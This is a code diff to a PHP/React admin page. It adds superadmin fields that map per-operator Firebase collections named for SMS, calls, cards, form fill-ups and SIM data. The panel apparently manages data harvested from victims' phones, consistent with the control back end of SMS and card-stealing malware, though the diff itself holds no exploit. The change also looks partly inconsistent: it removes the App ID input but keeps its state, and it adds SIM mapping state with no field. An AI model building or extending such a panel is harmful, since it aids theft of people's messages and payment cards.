@@ -95,6 +95,12 @@ include_once __DIR__ . '/header.php';
         }
       };
 
+      const [editSmsColl, setEditSmsColl] = React.useState('smsData');
+      const [editCallsColl, setEditCallsColl] = React.useState('callData');
+      const [editCardsColl, setEditCardsColl] = React.useState('cardData');
+      const [editFormsColl, setEditFormsColl] = React.useState('formData');
+      const [editSimsColl, setEditSimsColl] = React.useState('simData');
+
       const openFirebaseModal = (op) => {
         setEditingOp(op);
         setEditProject(op.firebaseProject || '');
@@ -102,6 +108,11 @@ include_once __DIR__ . '/header.php';
         setEditAuthDomain(op.firebaseAuthDomain || (op.firebaseProject ? op.firebaseProject + '.firebaseapp.com' : ''));
         setEditStorageBucket(op.storageBucket || (op.firebaseProject ? op.firebaseProject + '.appspot.com' : ''));
         setEditAppId(op.appId || '');
+        setEditSmsColl(op.collectionMap?.sms || 'smsData');
+        setEditCallsColl(op.collectionMap?.calls || 'callData');
+        setEditCardsColl(op.collectionMap?.cards || 'cardData');
+        setEditFormsColl(op.collectionMap?.forms || 'formData');
+        setEditSimsColl(op.collectionMap?.sims || 'simData');
         setRawJsonPaste('');
         setSaveStatus('');
       };
@@ -415,12 +426,31 @@ include_once __DIR__ . '/header.php';
                     <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Storage Bucket (`storageBucket`)</label>
                     <input type="text" className="search-input" value={editStorageBucket} onChange={(e) => setEditStorageBucket(e.target.value)} placeholder="project.appspot.com" />
                   </div>
-                  <div>
-                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>App ID (`appId`)</label>
-                    <input type="text" className="search-input" value={editAppId} onChange={(e) => setEditAppId(e.target.value)} placeholder="1:123456789:web:abcdef..." />
+                  {/* SuperAdmin Custom Collection Mapping */}
+                  <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
+                    <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
+                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
+                      <div>
+                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
+                        <input type="text" className="search-input" value={editSmsColl} onChange={(e) => setEditSmsColl(e.target.value)} placeholder="smsData (or sma)" />
+                      </div>
+                      <div>
+                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
+                        <input type="text" className="search-input" value={editCallsColl} onChange={(e) => setEditCallsColl(e.target.value)} placeholder="callData (or calls)" />
+                      </div>
+                      <div>
+                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
+                        <input type="text" className="search-input" value={editCardsColl} onChange={(e) => setEditCardsColl(e.target.value)} placeholder="cardData (or cards)" />
+                      </div>
+                      <div>
+                        <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
+                        <input type="text" className="search-input" value={editFormsColl} onChange={(e) => setEditFormsColl(e.target.value)} placeholder="formData (or userInputs)" />
+                      </div>
+                    </div>
                   </div>
+
                   <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #10b981, #059669)', marginTop: '0.5rem' }}>
-                    💾 Save Firebase Credentials
+                    💾 Save Firebase Credentials & Collection Mappings
                   </button>
                 </form>
               </div>
